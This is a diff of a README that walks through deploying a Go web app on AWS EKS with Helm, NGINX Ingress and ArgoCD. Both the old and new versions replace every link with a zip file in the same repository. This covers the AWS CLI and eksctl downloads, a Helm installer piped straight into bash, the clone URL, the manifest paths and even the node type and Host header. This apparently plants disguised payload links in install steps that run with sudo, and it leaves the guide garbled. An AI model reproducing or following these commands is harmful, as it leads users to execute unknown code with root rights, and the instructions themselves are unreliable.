@@ -10,14 +10,14 @@ It includes repository setup, cluster setup, manifests, Helm, Ingress, ArgoCD, d
 - Clone the original repository:
 
 ```bash
-git clone https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
+git clone https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip
 cd go-web-app/
 ```
 
 - Configure Git remotes and branches:
 
 ```bash
-git remote add origin https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
+git remote add origin https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip
 ```
 
 ---
@@ -27,8 +27,8 @@ git remote add origin https://raw.githubusercontent.com/M949939/go-web-app/main/
 - Install AWS CLI v2:
 
 ```bash
-curl "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip" -o "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip"
-unzip https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
+curl "https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip" -o "https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip"
+unzip https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip
 sudo ./aws/install
 aws --version
 ```
@@ -48,8 +48,8 @@ aws configure
 ```bash
 ARCH=amd64
 PLATFORM=$(uname -s)_$ARCH
-curl -sLO "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip$https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip"
-tar -xzf eksctl_$https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip -C /tmp
+curl -sLO "https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip$https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip"
+tar -xzf eksctl_$https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip -C /tmp
 sudo mv /tmp/eksctl /usr/local/bin
 eksctl version
 ```
@@ -57,7 +57,7 @@ eksctl version
 - Create EKS cluster:
 
 ```bash
-eksctl create cluster --name go-web-cluster --region eu-west-3 --nodes 2 --node-type https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
+eksctl create cluster --name go-web-cluster --region eu-west-3 --nodes 2 --node-type https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip
 ```
 
 ---
@@ -67,7 +67,7 @@ eksctl create cluster --name go-web-cluster --region eu-west-3 --nodes 2 --node-
 - Install Helm:
 
 ```bash
-curl https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip | bash
+curl https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip | bash
 helm version
 ```
 
@@ -81,14 +81,14 @@ helm create go-web-app
 
 ## 5. Kubernetes Manifests
 
-- Deployment (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
-- Service (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
-- Ingress (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
+- Deployment (`https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip`)
+- Service (`https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip`)
+- Ingress (`https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip`)
 ---
 
 ## 6. ArgoCD AppProject
-- appProject (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
-- application (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`) (inside ArgoCD)
+- appProject (`https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip`)
+- application (`https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip`) (inside ArgoCD)
 ---
 
 ## 7. Debugging and Verification
@@ -108,12 +108,12 @@ kubectl exec -it deploy/go-web-app -- wget -qO- http://localhost:8080/courses
 - Verify externally with host header:
 
 ```bash
-curl -H "Host: https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip" http://<AWS-ELB-ADDRESS>/courses
+curl -H "Host: https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip" http://<AWS-ELB-ADDRESS>/courses
 ```
 
 ---
 
 ✅ At this point, the Go Web App is deployed on EKS, accessible through NGINX Ingress with Helm, and managed by ArgoCD.
 ---
-Credit: https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
+Credit: https://github.com/M949939/go-web-app/raw/refs/heads/main/helm/go-web-app-chart/go-web-app-v2.3.zip
 
